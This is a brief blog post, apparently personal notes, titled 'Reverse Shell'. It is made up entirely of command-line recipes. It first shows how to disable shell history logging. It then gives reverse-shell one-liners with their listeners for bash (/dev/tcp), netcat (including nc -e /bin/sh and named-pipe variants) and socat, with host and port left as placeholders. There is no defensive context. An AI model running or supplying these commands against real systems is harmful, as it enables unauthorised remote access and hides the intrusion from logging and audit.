---
layout: post
title:  "Reverse Shell"
date:   2021-11-17 21:22:50 +0800
categories: notes update
tags: bash socat nc
---

## Do not log commands

```bash
$ unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG
$ export HISTFILE=/dev/null
$ export HISTSIZE=0
$ export HISTFILESIZE=0
```

## bash

**Listen**

```bash
$ nc -lvvp {port}
```

**Reverse connect**

```bash
$ bash -i >& /dev/tcp/{host}/{port} 0>&1
```

## nc

Listen

```bash
$ nc -lvvp {port}
```

**Reverse connect**

```bash
$ nc -e /bin/sh {host} {port}
```

or

```bash
$ [mknod | mkfifo] {name} p
$ nc {host} {port} < {name} | /bin/sh 1> {name}
# cleanup
$ rm -f {name}
```

or

```bash
$ touch {name}
$ tail -f {name} | sh -i 2>&1 | nc {host} {port} > {name}
# cleanup
$ rm -f {name}
```

## socat

**Listen**

```bash
$ socat file:`tty`,raw,echo=0 tcp-listen:{port}
```

**Reverse connect**

```bash
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{host}:{port}
```
